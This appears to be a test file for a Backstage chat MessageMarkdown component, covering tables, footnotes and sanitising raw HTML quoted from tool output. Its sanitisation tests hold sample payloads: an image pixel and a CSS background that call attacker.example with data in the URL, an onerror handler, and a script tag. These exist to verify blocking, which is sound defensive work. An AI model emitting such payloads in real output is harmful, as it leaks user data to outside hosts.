import { renderInTestApp } from '@backstage/frontend-test-utils';
import { screen } from '@testing-library/react';
import { MessageMarkdown } from './MessageMarkdown';

describe('MessageMarkdown', () => {
  it.each([
    '/workspace/giantswarm/bumblebee-plans/plan/grill-sessions/session.md',
    '/data/workspace/plan/PRD.md',
  ])('shows session path %s without routing to a portal page', async file => {
    await renderInTestApp(<MessageMarkdown text={`[Grill log](${file})`} />);

    expect(screen.queryByRole('link', { name: 'Grill log' })).toBeNull();
    expect(screen.getByText(file)).toBeInTheDocument();
    expect(screen.getByText(/session file/)).toBeInTheDocument();
  });

  it('keeps whole words in table cells, so a wide table scrolls instead', async () => {
    await renderInTestApp(
      <MessageMarkdown
        text={
          '| kubernetes_namespace | status |\n| - | - |\n| giantswarm | ok |'
        }
      />,
    );

    expect(
      screen.getByRole('columnheader', { name: 'kubernetes_namespace' }),
    ).toHaveStyle({ overflowWrap: 'normal' });
    expect(screen.getByRole('cell', { name: 'giantswarm' })).toHaveStyle({
      overflowWrap: 'normal',
    });
  });
});

describe('MessageMarkdown raw HTML', () => {
  const loaders = 'img, picture, source, video, audio, iframe, [src], [srcset]';

  it('loads nothing from an <img> quoted out of tool output', async () => {
    const { container } = await renderInTestApp(
      <MessageMarkdown
        text={
          'Tool said:\n\n<img src="https://attacker.example/pixel.png?d=secret" alt="pixel" onerror="alert(1)">\n\n<picture><source srcset="https://attacker.example/a.png"></picture>'
        }
      />,
    );

    expect(container.querySelector(loaders)).toBeNull();
    expect(container.querySelector('[onerror]')).toBeNull();
    expect(screen.getByRole('link', { name: /Image: pixel/ })).toHaveAttribute(
      'href',
      'https://attacker.example/pixel.png?d=secret',
    );
  });

  it('renders a Markdown image as a link instead of loading it', async () => {
    const { container } = await renderInTestApp(
      <MessageMarkdown text="![chart](https://example.com/chart.png)" />,
    );

    expect(container.querySelector(loaders)).toBeNull();
    expect(screen.getByRole('link', { name: /Image: chart/ })).toBeVisible();
  });

  it('keeps <details> blocks', async () => {
    const { container } = await renderInTestApp(
      <MessageMarkdown
        text={'<details><summary>Logs</summary>\n\nline one\n\n</details>'}
      />,
    );

    expect(container.querySelector('details > summary')).toHaveTextContent(
      'Logs',
    );
    expect(screen.getByText('line one')).toBeInTheDocument();
  });

  it('keeps the language class of a fenced code block', async () => {
    const { container } = await renderInTestApp(
      <MessageMarkdown text={'```yaml\na: 1\n```'} />,
    );

    expect(container.querySelector('pre > code.language-yaml')).not.toBeNull();
  });

  it('drops inline styles and scripts from raw HTML', async () => {
    const { container } = await renderInTestApp(
      <MessageMarkdown text='<div style="background:url(https://attacker.example/bg)">x</div><script>alert(1)</script>' />,
    );

    expect(container.querySelector('[style*="attacker"]')).toBeNull();
    expect(container.querySelector('script')).toBeNull();
  });

  it('links a GFM footnote to its note and back', async () => {
    const { container } = await renderInTestApp(
      <MessageMarkdown text={'A claim.[^1]\n\n[^1]: The source.'} />,
    );

    const ref = container.querySelector('a[data-footnote-ref]');
    const back = container.querySelector('a[data-footnote-backref]');
    const note = ref?.getAttribute('href')?.slice(1);
    const origin = back?.getAttribute('href')?.slice(1);
    expect(note).toBe('user-content-fn-1');
    expect(container.querySelector(`[id="${note}"]`)).toHaveTextContent(
      'The source.',
    );
    expect(origin).toBe('user-content-fnref-1');
    expect(container.querySelector(`[id="${origin}"]`)).toBe(ref);
  });
});
